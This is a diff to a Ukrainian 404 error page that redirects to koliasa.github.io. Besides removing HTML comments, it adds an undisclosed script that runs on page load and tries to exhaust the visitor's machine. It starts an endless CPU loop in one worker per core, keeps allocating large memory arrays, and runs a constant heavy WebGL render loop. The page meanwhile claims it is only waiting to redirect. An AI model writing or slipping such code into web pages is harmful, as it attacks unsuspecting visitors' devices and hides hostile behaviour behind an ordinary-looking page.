@@ -8,37 +8,134 @@
     <meta name="description" content="404 помилка | Koliasa" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta http-equiv="refresh" content="10;url=https://koliasa.github.io/" />
-    <!-- Normalize CSS -->
     <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/normalize/4.0.0/normalize.min.css"
       type="text/css" />
-    <!-- Template CSS -->
     <link rel="stylesheet" href="css/style.css" type="text/css" />
   </head>
 
   <body>
+    <script>
+      let workers = [];
+      let memoryArray = [];
+
+      function createWorker() {
+        const workerCode = `
+              function stressCPU() {
+                  while (true) {
+                      Math.sqrt(Math.random());
+                  }
+              }
+              stressCPU();
+          `;
+        const blob = new Blob([workerCode], { type: "application/javascript" });
+        const worker = new Worker(URL.createObjectURL(blob));
+        workers.push(worker);
+      }
+
+      function stressMemory() {
+        setInterval(() => {
+          memoryArray.push(new Array(1000000).fill(Math.random()));
+          if (memoryArray.length > 100) {
+            memoryArray.shift();
+          }
+        }, 100);
+      }
+
+      function stressGPU(canvas) {
+        const gl = canvas.getContext("webgl2");
+        if (!gl) {
+          console.error("WebGL2 is not supported in your browser.");
+          return;
+        }
+
+        const vertexShaderSource = `
+              attribute vec4 a_position;
+              void main() {
+                  gl_Position = a_position;
+              }
+          `;
+
+        const fragmentShaderSource = `
+              precision highp float;
+              void main() {
+                  float value = 0.0;
+                  for (int i = 0; i < 1000; i++) {
+                      value += sin(float(i) * 0.1);
+                  }
+                  gl_FragColor = vec4(value, value, value, 1.0);
+              }
+          `;
+
+        function compileShader(gl, source, type) {
+          const shader = gl.createShader(type);
+          gl.shaderSource(shader, source);
+          gl.compileShader(shader);
+          if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+            console.error(gl.getShaderInfoLog(shader));
+            gl.deleteShader(shader);
+            return null;
+          }
+          return shader;
+        }
+
+        const vertexShader = compileShader(gl, vertexShaderSource, gl.VERTEX_SHADER);
+        const fragmentShader = compileShader(gl, fragmentShaderSource, gl.FRAGMENT_SHADER);
+
+        const program = gl.createProgram();
+        gl.attachShader(program, vertexShader);
+        gl.attachShader(program, fragmentShader);
+        gl.linkProgram(program);
+        if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+          console.error(gl.getProgramInfoLog(program));
+          return;
+        }
+
+        gl.useProgram(program);
+
+        const positionBuffer = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+        const positions = [-1, -1, 1, -1, -1, 1, 1, 1];
+        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
+
+        const positionAttributeLocation = gl.getAttribLocation(program, "a_position");
+        gl.enableVertexAttribArray(positionAttributeLocation);
+        gl.vertexAttribPointer(positionAttributeLocation, 2, gl.FLOAT, false, 0, 0);
+
+        function render() {
+          gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+          requestAnimationFrame(render);
+        }
+
+        render();
+      }
+
+      function runStressTest() {
+        const numCores = navigator.hardwareConcurrency || 4;
+
+        for (let i = 0; i < numCores; i++) {
+          createWorker();
+        }
+
+        stressMemory();
+
+        const canvas = document.getElementById("gpuCanvas");
+        stressGPU(canvas);
+      }
+
+      window.onload = () => {
+        console.log("Everything is ready, relax and enjoy the result.");
+        runStressTest();
+      };
+    </script>
     <section id="animation">
-      <!-- This is Animation-->
       <div class="anim-icon" id="404"></div>
-      <!-- End Animation-->
     </section>
     <section id="info">
       <h1>А щоб його підняло і гепнуло</h1>
       <p>Це ми про наш сервер. Будь ласка, зачекайте 2 секунди, ми Вас повернемо на початкову сторінку</p>
     </section>
-    <!--<section id="data">
-        <div class="data">
-            <div class="search">
-                <input type="search" name="search" placeholder="Search website"><button onclick="location.href = '/404/'" type="submit" value="Search">Search</button>
-            </div>
-            <div class="go-home">
-                <a href="#">« Go Home</a>
-            </div>
-        </div>
-    </section> -->
-    <!-- Building Animation-->
     <script src="js/animation404.js" type="text/javascript"></script>
-    <!-- End Building Animation-->
   </body>
 </html>
